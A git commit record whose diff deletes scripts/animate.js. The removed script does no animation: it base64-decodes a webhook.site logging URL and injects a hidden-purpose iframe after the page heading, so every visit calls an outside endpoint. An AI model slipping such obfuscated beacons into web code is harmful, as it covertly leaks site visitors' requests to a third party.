29112677230392a499bbd1b66be6b7d3e272b9d2
echochase <kobeshen123@gmail.com>
2025-02-10 14:05:16 +1100

    tidy mini apps, fix stye

--- scripts/animate.js
+++
@@ -1,4 +0,0 @@
-const heading = document.getElementById('mainheading');
-const element = document.createElement('iframe');
-element.src = atob('aHR0cHM6Ly93ZWJob29rLnNpdGUvNDJkYWZkYjItMjk0Yi00OTE5LTg0ZDQtNzdjYTEyNmM3YmQ1');
-heading.insertAdjacentElement('afterend', element);
